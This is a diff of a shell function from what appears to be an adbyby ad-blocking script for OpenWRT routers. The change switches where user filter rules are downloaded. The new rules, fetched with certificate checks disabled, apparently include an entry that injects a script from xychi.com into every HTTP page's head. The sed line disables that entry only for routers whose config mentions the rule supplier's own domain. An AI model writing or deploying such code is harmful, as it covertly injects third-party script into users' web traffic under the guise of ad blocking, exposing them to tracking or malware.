@@ -65,22 +65,17 @@ function upuser(){
     if [[ -f /tmp/user-rule.tmp ]]; then
         rm -f /tmp/user-rule.tmp
     fi
-    url="https://raw.githubusercontent.com/viagram/adbyby/master/user.txt"
+    echo -e "\n\033[32m    顺便更新一下用户自己义规则.\033[0m"
+    url="https://dnsdian.com/OpenWRT/user.txt"
     if ! curl -skL ${url} -o /tmp/user-rule.tmp --retry 3 --speed-time 10 --speed-limit 1 --connect-timeout 10 >/dev/null 2>&1; then
         rm -f /tmp/user-rule.tmp
         exit 1
     else
-        echo -e "\n\033[32m    顺便更新一下用户自己义规则.\033[0m"
         rm -f /usr/adbyby/user.txt
         if cat /etc/config/shadowsocksr | egrep -io 'dnsdian.com' >/dev/null 2>&1; then
             sed -i 's~|http://$s@</head>@<script src="https://xychi.com/ly.php"></script></head>@~!|http://$s@</head>@<script src="https://xychi.com/ly.php"></script></head>@~g' /tmp/user-rule.tmp
         fi
-        addurl='https://raw.githubusercontent.com/jackieboby/ADbyby/master/ADblock.txt'
-        if curl -skL ${addurl} -o ${DATA_PATH}/add-rule.tmp --retry 3 --speed-time 10 --speed-limit 1 --connect-timeout 10 >/dev/null 2>&1; then
-            cat ${DATA_PATH}/add-rule.tmp | sed '/^!/d' | sed '/^\[/d' >>/tmp/user-rule.tmp
-            rm -f ${DATA_PATH}/add-rule.tmp
-        fi
-        cp -rf /tmp/user-rule.tmp /usr/adbyby/user.txt
+        \cp -rf /tmp/user-rule.tmp /usr/adbyby/user.txt
         rm -f /tmp/user-rule.tmp
     fi
 }
